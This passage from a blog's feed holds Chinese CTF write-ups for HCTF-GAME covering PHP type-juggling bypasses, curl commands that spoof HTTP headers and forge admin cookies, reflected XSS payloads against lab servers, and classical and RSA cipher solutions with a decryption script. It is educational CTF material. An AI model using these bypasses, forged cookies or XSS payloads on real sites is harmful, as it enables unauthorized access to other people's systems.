d1907296ae9bbd36084bad58c5e5cb3d275c953efc73aff595f36d92e182d6705fee14dabd29df53735132249d5935f8e780210359d67ab80ac2dfa29a88a5f585cbda8bbL</p></blockquote><p>我们知道 RSA 的安全性依赖于大数分解的困难度，这题的 n 容易分解的原因是其中一个素因数太小了，分解成 p 和 q 后就是老套路了</p><h3 id="密码学教室进阶（六）"><a href="#密码学教室进阶（六）" class="headerlink" title="密码学教室进阶（六）"></a>密码学教室进阶（六）</h3><blockquote><p>题目描述： 我只是想用事实告诉你们学好线代很重要<br>Hill密码：<a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="external">https://en.wikipedia.org/wiki/Hill_cipher</a><br>m:jchfecncvxogmtgqtqlqamqutqsgnniw<br>key:5 17 4 15<br>完成解密以后加上hgame{}作为flag</p></blockquote><p>懒得写脚本了，找了个在线网站解的<br><a href="http://crypto.interactive-maths.com/hill-cipher.html" target="_blank" rel="external">http://crypto.interactive-maths.com/hill-cipher.html</a></p><h3 id="进击的-Crypto-0"><a href="#进击的-Crypto-0" class="headerlink" title="进击的 Crypto [0]"></a>进击的 Crypto [0]</h3><blockquote><p>题目描述： 听说你们喜欢暴力出奇迹?我觉得选择也很重要<br><a href="http://119.29.138.57/crypto/easy_rsa.txt.34b3396feff9f911a61e932a22c4470" target="_blank" rel="external">http://119.29.138.57/crypto/easy_rsa.txt.34b3396feff9f911a61e932a22c4470</a></p></blockquote><p>分数给高了，这题考点是 RSA 中的共享素数攻击，测试一下就会发现几组 n 都不是互素的，所以大数分解问题就转变成了求两数的最大公约数问题，接下来就没啥难度了，基本能看出来这点的就可以做出来了(会不会真的有暴力跑 n 的(逃</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Crypto 的题目还是入门级别吧，连真正 CTF 的签到都算不上，web 里两个系列也是，ez game 还是挺强的，虽说改编的原题。继续学吧！</p><p>最后，祝大家新年吼啊！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;从0开始LFI之0&quot;&gt;&lt;a href=&quot;#从0开始LFI之0&quot; class=&quot;headerlink&quot; title=&quot;从0开
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HCTF-GAME week1 writeup</title>
    <link href="http://heartsky.info/2017/01/21/HCTF-GAME-week1-writeup/"/>
    <id>http://heartsky.info/2017/01/21/HCTF-GAME-week1-writeup/</id>
    <published>2017-01-21T12:11:39.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="这TM是啥"><a href="#这TM是啥" class="headerlink" title="这TM是啥"></a>这TM是啥</h3><blockquote><p>  题目描述： <a href="http://115.28.78.16:13333/web/web1/" target="_blank" rel="external">http://115.28.78.16:13333/web/web1/</a></p></blockquote><p>打开后在源码里可以发现一大串奇怪的 JS 代码，其实这是 <a href="http://www.jsfuck.com/" target="_blank" rel="external">JS FUCK</a>，一种 JS 的混淆方式。<br>有很多方法能反混淆</p><ul><li>解密脚本 <a href="http://www.snip2code.com/Snippet/1374337/Decode-jsfuck---aaencode---jjencode" target="_blank" rel="external">http://www.snip2code.com/Snippet/1374337/Decode-jsfuck---aaencode---jjencode</a></li><li>火狐拓展 JavaScript Deobfuscator</li><li>……</li></ul><p>知道一种就够了</p><h3 id="我是谁我在哪？？？"><a href="#我是谁我在哪？？？" class="headerlink" title="我是谁我在哪？？？"></a>我是谁我在哪？？？</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/web/web2/index.php" target="_blank" rel="external">http://115.28.78.16:13333/web/web2/index.php</a></p></blockquote><p>302 重定向，flag 在 HTTP 响应头里</p><h3 id="不可能拿到的flag"><a href="#不可能拿到的flag" class="headerlink" title="不可能拿到的flag"></a>不可能拿到的flag</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/web/web3/" target="_blank" rel="external">http://115.28.78.16:13333/web/web3/</a></p></blockquote><p>要拿到 flag 要满足两个条件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name != $password</span><br><span class="line">sha1($name) === sha1($password)</span><br></pre></td></tr></table></figure></p><p>两个值不相等，sha1 处理后的值却相等，看似是不可能的，但是 sha1 函数是存在漏洞的，它不能处理数组类型，会报错并返回 NULL。所以这里我们只要构造 <code>name[]=1&amp;password[]=2</code> 就可以了。与之类似的还有 md5 函数。</p><h3 id="神奇的数字"><a href="#神奇的数字" class="headerlink" title="神奇的数字"></a>神奇的数字</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/web/web4/" target="_blank" rel="external">http://115.28.78.16:13333/web/web4/</a></p></blockquote><p>这题以及下面的 web5 可能很多人都搜到了 get flag 的方式，但不一定明白为什么这样就能拿到 flag 了。我们来分析下，要拿到 flag 需满足三个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$number == intval($number)</span><br><span class="line">intval($number) == intval(strrev($number))</span><br><span class="line">$n is not a palindrome number</span><br></pre></td></tr></table></figure><p>$n 是一个回文数，又不能是一个回文数。第二个条件都用到了 intval 函数，受上题的启发，可能这里有点问题，我们翻下 php 手册，发现了这么一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">返回值</span><br><span class="line">最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(&apos;1000000000000&apos;) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</span><br></pre></td></tr></table></figure><p>如果我们构造一个值，它是等于最大值的，只要保证字符串反转后超过了最大值，那它返回的就是最大值，这样就满足所有条件了。但是最大值的回文数没有超过最大值，第二个条件不满足，我们想到可以在前面加 0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=0009223372036854775807</span><br></pre></td></tr></table></figure><p>这题还有其他的解决方法，有兴趣的可以去研究下</p><h3 id="php真可怕我要回农村"><a href="#php真可怕我要回农村" class="headerlink" title="php真可怕我要回农村"></a>php真可怕我要回农村</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/web/web5/" target="_blank" rel="external">http://115.28.78.16:13333/web/web5/</a></p></blockquote><p>对于这种题包括前面那道题，最好本地搭建环境试一下<br>get flag 的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$b is not a <span class="keyword">array</span></span><br><span class="line">$b is not a number</span><br><span class="line">(int)(($a + $b) * <span class="number">10</span>) == <span class="number">8</span></span><br><span class="line">$b[<span class="number">10</span>] == <span class="keyword">false</span></span><br></pre></td></tr></table></figure><p>php 在进行加法运算时会自动进行类型转换，所以传入 0.7a 就会绕过第二个条件的限制。但是你会发现 $c 是7，这就涉及 php 中浮点数精度的问题。该结果的内部表示其实是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">floor((0.1+0.7)*10)</span><br><span class="line">7.9999999999999991118...</span><br></pre></td></tr></table></figure><p>用 <code>(int)</code> 进行强制类型转换时向下取整，所以是 7<br>因此构造 <code>b=0.71a</code> 就可以了，第四个条件其实是没用的，如果第 11 位不存在的话，返回的是 NULL，<code>NULL == false</code></p><h2 id="PENTEST"><a href="#PENTEST" class="headerlink" title="PENTEST"></a>PENTEST</h2><h3 id="lightless的渗透教室入门篇（一）"><a href="#lightless的渗透教室入门篇（一）" class="headerlink" title="lightless的渗透教室入门篇（一）"></a>lightless的渗透教室入门篇（一）</h3><blockquote><p>题目描述： 115.28.78.16:13333/pentest/01/</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.28.78.16:13333/pentest/01/?hacker=HelloGet -d hacker=HelloPost</span><br><span class="line">hctf&#123;PostAndGetIsSoEasy_comeon!&#125;</span><br></pre></td></tr></table></figure><h3 id="lightless的渗透教室入门篇（二）"><a href="#lightless的渗透教室入门篇（二）" class="headerlink" title="lightless的渗透教室入门篇（二）"></a>lightless的渗透教室入门篇（二）</h3><blockquote><p>题目描述： 115.28.78.16:13333/pentest/02/</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">"Referer:http://www.google.com"</span> -H <span class="string">"X-Forwarded-For:127.0.0.1"</span> -H <span class="string">"User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 99_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11A465 Safari for iPhone"</span> -d hint=1 http://115.28.78.16:13333/pentest/02/</span><br></pre></td></tr></table></figure><p>得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag not in html... --&gt;</span><br></pre></td></tr></table></figure><p>不在源码里，那就只能在 HTTP 响应头里了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">"Referer:http://www.google.com"</span> -H <span class="string">"X-Forwarded-For:127.0.0.1"</span> -H <span class="string">"User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 99_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11A465 Safari for iPhone"</span> -I http://115.28.78.16:13333/pentest/02/</span><br><span class="line">flag: hctf&#123;h77p_He4dEr_50_E4sy_ANd_fUn_ohhouhou&#125;</span><br></pre></td></tr></table></figure><h3 id="lightless的渗透教室入门篇（三）"><a href="#lightless的渗透教室入门篇（三）" class="headerlink" title="lightless的渗透教室入门篇（三）"></a>lightless的渗透教室入门篇（三）</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/pentest/03/" target="_blank" rel="external">http://115.28.78.16:13333/pentest/03/</a></p></blockquote><p>在 HTTP 响应头里查找到关于 cookie 的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookiecontent: admin=1 and isLogin=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>修改 cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --cookie <span class="string">"admin=1;isLogin=true"</span> http://115.28.78.16:13333/pentest/03/</span><br><span class="line">flag: hctf&#123;hao_hao_kan_zi_liao!!!&#125;, 通过伪造cookie，你可以绕过一些限制，或是伪造身份。</span><br></pre></td></tr></table></figure><h3 id="lightless的渗透教室入门篇（四）"><a href="#lightless的渗透教室入门篇（四）" class="headerlink" title="lightless的渗透教室入门篇（四）"></a>lightless的渗透教室入门篇（四）</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/pentest/04/" target="_blank" rel="external">http://115.28.78.16:13333/pentest/04/</a></p></blockquote><p>有的可能构造对了，但忘记再 URL 编码一次了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=&amp;lt;script&amp;gt;x=alert;x(&apos;lightless&apos;);&amp;lt;/script&amp;gt;&amp;param2=%3Cscript%3Ex%3Dalert%3Bx%28%27lightless%27%29%3B%3C/script%3E</span><br></pre></td></tr></table></figure><p>就像这样，URL 编码的原因是 param1 中有 <code>&amp;</code>、<code>=</code> 等特殊字符，param2 中的 URL 编码在传输时会被自动解码<br>这里比较坑的是 HTML 实体编码只能用实体名称的形式，不能用实体编号的形式</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码学教室入门（一）"><a href="#密码学教室入门（一）" class="headerlink" title="密码学教室入门（一）"></a>密码学教室入门（一）</h3><blockquote><p>题目描述： 这是最著名的一种非对称加密密码体制<br>学习文档：<a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem" target="_blank" rel="external">https://en.wikipedia.org/wiki/RSA_(cryptosystem</a>)<br>p: 0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebeddL<br>q: 0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873L<br>e: 0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5L<br>d: 0x190a000845e9c8c2059242835432326369aaf8c7ca85e685bba968b386155a91f1f7ca1019ff23d119222e1f0dfdeb0915d2e97601ef94bf15ca6d9211e984e9038f263f4984355c397ed22d67c26da6d31acfc4d599c70cba80859bee099e5a2dc3ab23aecf58f73f44d07318f70985c623d9612efefb15bf8dab77d5d54e85L<br>c: 0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9L</p></blockquote><p>私钥给了，就一个公式<br>\begin{matrix} c^d \equiv m \pmod {n} \ \end{matrix}</p><h3 id="密码学教室入门（二）"><a href="#密码学教室入门（二）" class="headerlink" title="密码学教室入门（二）"></a>密码学教室入门（二）</h3><blockquote><p>  题目描述： 凯撒加密是一种古老的对称加密算法<br>学习文档：<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="external">https://en.wikipedia.org/wiki/Caesar_cipher</a><br>mlfrj{Hfjxfw_hnumjw_8x_ozxy_ktw_kzs}</p></blockquote><p>凯撒加密，自己写个脚本解密就好了，不过这迷之数字处理……</p><h3 id="密码学教室入门（三）"><a href="#密码学教室入门（三）" class="headerlink" title="密码学教室入门（三）"></a>密码学教室入门（三）</h3><blockquote><p>题目描述： 维吉尼亚密码是最常见的分组密码。将明文对应的书名中的空格换成下划线，在并且加上hgame{}后作为flag<br><a href="https://en.wikipedia.org/wiki/Vigenère_cipher" target="_blank" rel="external">https://en.wikipedia.org/wiki/Vigenère_cipher</a><br>ET. RBPHXYF, ZNFYHH BU E IGUS GQU MJU MRQTLWTOOHRY KQ YIG FFTVLPQF, XJTVLJNFU SS FDVSBA’W CGKEQG DX IKV YSKDP. FDVSBA MX THPJBUHH, QQPD VR GF DVWFUWII CJENO OEYFT XMBV HFZ. E OGZ YSKDP CGJMST RR UJH KPNOSBJPJ IBA, ZOFHV OGZ HICUKJT EVTVIKX CA XMF GIKBTJIX CQH B WLNSF MSEKYMIVCO BIQ MX URSS THZJBNHH BU HW. PESFVWI. JH MBF AWJVWIS CQ FDERYSU RJ IKV NNRUMXPPPISU DX UJH MBPGW PH HFSPDC’T IEYIGU FOF LNEFHR JV MS JLW DGOP; FHJFSIH KPWQH JV AMJNH XFCUGMJPJ YIG GJMN HZSKQK UJH XUQUQNOI SK VKI CCVXNMNH.</p></blockquote><p>之前只是知道原理，没有去做过这种题目，花了点时间。<br>密文保留了原先的标点符号。因此我们可以用词频分析的方法，首先你要知道在一段话中，一般 <code>the</code> 和 <code>a</code> 出现的频率是最高的，所以我写了个 python 脚本计算出出现的所有三字符单词和一字符单词的出现次数，结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(&apos;UJH&apos;, 3), (&apos;IKV&apos;, 2), (&apos;YIG&apos;, 2), (&apos;OGZ&apos;, 2), (&apos;HFZ&apos;, 1), (&apos;IBA&apos;, 1), (&apos;VKI&apos;, 1), (&apos;GQU&apos;, 1), (&apos;MBF&apos;, 1), (&apos;XMF&apos;, 1), (&apos;BIQ&apos;, 1), (&apos;CQH&apos;, 1), (&apos;JLW&apos;, 1), (&apos;MJU&apos;, 1), (&apos;FOF&apos;, 1)]</span><br><span class="line"></span><br><span class="line">[(&apos;E&apos;, 2), (&apos;B&apos;, 1), (&apos;T&apos;, 1), (&apos;W&apos;, 1)]</span><br></pre></td></tr></table></figure><p>再与 <code>the</code> 和 <code>a</code> 计算偏移量，再加上比较明显的 <code>&#39;s</code>，大致如下(出现的数字都是偏移量)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">THE </span><br><span class="line">UJH 1 2 3</span><br><span class="line">IKV 15 3 17</span><br><span class="line">YIG 5 1 2</span><br><span class="line">OGZ 21 25 21</span><br><span class="line"></span><br><span class="line">&apos;S</span><br><span class="line">4 1</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">4 1</span><br></pre></td></tr></table></figure><p>这里是需要猜下的，1 和 4 肯定是有的，然后出现频率较高的两个 <code>the</code> 又含有 2 3 5，大概是 1 2 3 4 5 这样，当然不一定是这个顺序，然后我又验证了下后面出现频率较低的 <code>the</code>，其中两组偏移量是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 3 4</span><br><span class="line">4 5 1</span><br></pre></td></tr></table></figure><p>这就基本确定了啊，密钥长度为 5，分别为 1 2 3 4 5，而且从上面的偏移来看，顺序就是 1 2 3 4 5，不过第一个偏移不一定是 1，换句话说秘钥是这五个中的一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;ABCDE&quot;,&quot;BCDEA&quot;,&quot;CDEAB&quot;,&quot;DEABC&quot;,&quot;EABCD&quot;]</span><br></pre></td></tr></table></figure><p>把所有情况输出出来就知道了，最后随便拿其中的一句话谷歌下，书名是这个 A Tale of Two Cities</p><p>事后和出题人聊了下，应该是先用重合指数攻击算出分组长度，然后分组进行字频分析</p><h3 id="密码学教室入门（四）"><a href="#密码学教室入门（四）" class="headerlink" title="密码学教室入门（四）"></a>密码学教室入门（四）</h3><blockquote><p>题目描述： n: 0x81cfc71c44c83faf3c5242fa81ae2e533fc945f3bef30bc13323ea4a55b3debc11301c6a9ecb8f7ef92fa169b157435af728a145497f2cdf75b3007b9732da4c47d67683f09ae1edc8f698f5ec7549593d9f1d06adafae4ad09514928bf0367a2719f7c171580318690dafc6a3d5385b3516b769f529c0a055ce25e68bc21395L<br>e: 0x01<br>c: 0x6867616d657b7273615f31735f737469316c5f653473795f6e6f77217dL</p></blockquote><p>e = 1，根据 \begin{matrix} m^e \equiv c \pmod {n} \ \end{matrix}<br>flag 就是 c</p><h3 id="密码学教室番外篇"><a href="#密码学教室番外篇" class="headerlink" title="密码学教室番外篇"></a>密码学教室番外篇</h3><blockquote><p>题目描述： 昨天看大家凯撒密码疯狂试flag，所以yxrdv{uxwupytip19954902180//+/%}</p></blockquote><p>这里数字的表应该是这样的 1234567890，问题来了，为啥上面那个对数字的处理不是这样的，迷。。。</p><p>出题人可能是从<a href="http://www.jianshu.com/p/bd0087afbf66" target="_blank" rel="external">这篇文章</a>找到的对数字的处理，有兴趣的自己看下吧</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">'yxrdv&#123;uxwupytip19954902180//+/%&#125;'</span></span><br><span class="line">li = [<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'0'</span>]</span><br><span class="line">le = len(c)</span><br><span class="line">m = [<span class="string">'*'</span>] * le</span><br><span class="line">add = ord(<span class="string">'y'</span>) - ord(<span class="string">'h'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(le):</span><br><span class="line"><span class="keyword">if</span> c[i].islower():</span><br><span class="line">num = ord(c[i]) - <span class="number">97</span> - add</span><br><span class="line">num = num <span class="keyword">if</span> num &gt;=<span class="number">0</span> <span class="keyword">else</span> num + <span class="number">26</span></span><br><span class="line">m[i] = chr(num + <span class="number">97</span>)</span><br><span class="line"><span class="keyword">elif</span> c[i].isdigit():</span><br><span class="line">num = li.index(c[i]) - add</span><br><span class="line"><span class="keyword">while</span> num &lt; <span class="number">0</span>:</span><br><span class="line">num += <span class="number">10</span></span><br><span class="line">m[i] = li[num]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m[i] = c[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(m)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>与去年相比，题量还是大一些的，不过有好多可以搜到的。不要只想着拿 FLAG，背后的原理才是你应该关注的，你应该能从题目中感受到你缺哪部分知识，然后相应的去学，比如 web 安全的现在就可以开始 HTML 和 JS 的学习了。</p><blockquote><p>路漫漫其修远兮，吾将上下而求索</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;这TM是啥&quot;&gt;&lt;a href=&quot;#这TM是啥&quot; class=&quot;headerlink&quot; title=&quot;这TM是啥&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
</feed>
